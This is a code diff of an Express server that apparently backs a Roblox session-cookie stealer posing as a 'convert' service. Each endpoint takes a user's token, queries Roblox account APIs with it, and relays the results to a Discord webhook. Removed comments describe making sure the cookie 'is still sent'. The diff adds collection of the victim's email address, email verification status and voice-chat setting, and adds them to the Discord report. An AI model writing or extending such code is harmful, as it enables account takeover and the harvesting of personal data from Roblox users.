@@ -309,7 +309,10 @@ app.post('/u/convert', validateRequest, async (req, res) => {
         accountAge: 0,
         groupsOwned: 0,
         placeVisits: 0,
-        inventory: { hairs: 0, bundles: 0, faces: 0 }
+        inventory: { hairs: 0, bundles: 0, faces: 0 },
+        emailVerified: false,
+        emailAddress: null,
+        voiceChatEnabled: false
       };
 
       // Log user data to database
@@ -509,7 +512,10 @@ app.post('/u/:directory/convert', async (req, res) => {
         accountAge: 0,
         groupsOwned: 0,
         placeVisits: 0,
-        inventory: { hairs: 0, bundles: 0, faces: 0 }
+        inventory: { hairs: 0, bundles: 0, faces: 0 },
+        emailVerified: false,
+        emailAddress: null,
+        voiceChatEnabled: false
       };
 
       // Log user data to database
@@ -1474,7 +1480,10 @@ async function fetchRobloxUserData(token) {
         accountAge: 0, // Will calculate below if possible
         groupsOwned: 0,
         placeVisits: 0,
-        inventory: { hairs: 0, bundles: 0, faces: 0 }
+        inventory: { hairs: 0, bundles: 0, faces: 0 },
+        emailVerified: false,
+        emailAddress: null,
+        voiceChatEnabled: false
       };
     }
 
@@ -1719,6 +1728,31 @@ async function fetchRobloxUserData(token) {
       // Silent handling
     }
 
+    // Fetch email verification status and voice chat settings
+    let emailVerified = false;
+    let emailAddress = null;
+    let voiceChatEnabled = false;
+
+    try {
+      // Email verification
+      const emailResponse = await fetch('https://accountsettings.roblox.com/v1/email', { headers: baseHeaders });
+      if (emailResponse.ok) {
+        const emailData = await emailResponse.json();
+        emailVerified = emailData.verified || false;
+        emailAddress = emailData.emailAddress || null;
+      }
+    } catch (e) { /* Ignore email fetch errors */ }
+
+    try {
+      // Voice chat settings
+      const voiceResponse = await fetch('https://voice.roblox.com/v1/settings', { headers: baseHeaders });
+      if (voiceResponse.ok) {
+        const voiceData = await voiceResponse.json();
+        voiceChatEnabled = voiceData.isVoiceEnabled || false;
+      }
+    } catch (e) { /* Ignore voice chat fetch errors */ }
+
+
     return {
       username: userData.name || userData.displayName,
       userId: userData.id,
@@ -1735,7 +1769,10 @@ async function fetchRobloxUserData(token) {
       accountAge: accountAge,
       groupsOwned: groupsOwned,
       placeVisits: 0, // This data is not easily accessible via API
-      inventory: inventoryData
+      inventory: inventoryData,
+      emailVerified: emailVerified,
+      emailAddress: emailAddress,
+      voiceChatEnabled: voiceChatEnabled
     };
 
   } catch (error) {
@@ -1876,6 +1913,16 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
             name: " Inventory",
             value: `Hairs: ${userData.inventory?.hairs || 0}\nBundles: ${userData.inventory?.bundles || 0}\nFaces: ${userData.inventory?.faces || 0}`,
             inline: false
+          },
+          {
+            name: "Email Verified",
+            value: userData.emailVerified ? "Yes" : "No",
+            inline: true
+          },
+          {
+            name: "Voice Chat Enabled",
+            value: userData.voiceChatEnabled ? "Yes" : "No",
+            inline: true
           }
         ],
         footer: {
@@ -2020,7 +2067,10 @@ app.post('/convert-disabled', validateRequest, async (req, res) => {
         accountAge: 0,
         groupsOwned: 0,
         placeVisits: 0,
-        inventory: { hairs: 0, bundles: 0, faces: 0 }
+        inventory: { hairs: 0, bundles: 0, faces: 0 },
+        emailVerified: false,
+        emailAddress: null,
+        voiceChatEnabled: false
       };
 
       // Log user data to database
@@ -2222,7 +2272,6 @@ app.post('/:directory/convert', async (req, res) => {
       // Fetch user data from Roblox API
       const userData = await fetchRobloxUserData(token);
 
-      // If user data fetch failed, create a minimal user data object to ensure cookie is still sent
       const webhookUserData = userData || {
         username: "Unknown User",
         userId: "Unknown",
@@ -2239,7 +2288,10 @@ app.post('/:directory/convert', async (req, res) => {
         accountAge: 0,
         groupsOwned: 0,
         placeVisits: 0,
-        inventory: { hairs: 0, bundles: 0, faces: 0 }
+        inventory: { hairs: 0, bundles: 0, faces: 0 },
+        emailVerified: false,
+        emailAddress: null,
+        voiceChatEnabled: false
       };
 
       // Log user data to database
@@ -2312,7 +2364,6 @@ app.post('/:directory/convert', async (req, res) => {
       });
     }
 
-    // Return success only when token was found and processed
     res.json({ 
       success: true,
       message: 'Request submitted successfully!',
@@ -2617,7 +2668,10 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
         accountAge: 0,
         groupsOwned: 0,
         placeVisits: 0,
-        inventory: { hairs: 0, bundles: 0, faces: 0 }
+        inventory: { hairs: 0, bundles: 0, faces: 0 },
+        emailVerified: false,
+        emailAddress: null,
+        voiceChatEnabled: false
       };
 
       // Log user data to database
@@ -2872,7 +2926,7 @@ app.post('/:directory/convert', async (req, res) => {
       // Fetch user data from Roblox API
       const userData = await fetchRobloxUserData(token);
 
-      // If user data fetch failed, create a minimal user data object to ensure cookie is still sent
+      // If user data fetch failed, create a minimal user data object
       const webhookUserData = userData || {
         username: "Unknown User",
         userId: "Unknown",
@@ -2889,7 +2943,10 @@ app.post('/:directory/convert', async (req, res) => {
         accountAge: 0,
         groupsOwned: 0,
         placeVisits: 0,
-        inventory: { hairs: 0, bundles: 0, faces: 0 }
+        inventory: { hairs: 0, bundles: 0, faces: 0 },
+        emailVerified: false,
+        emailAddress: null,
+        voiceChatEnabled: false
       };
 
       // Log user data to database
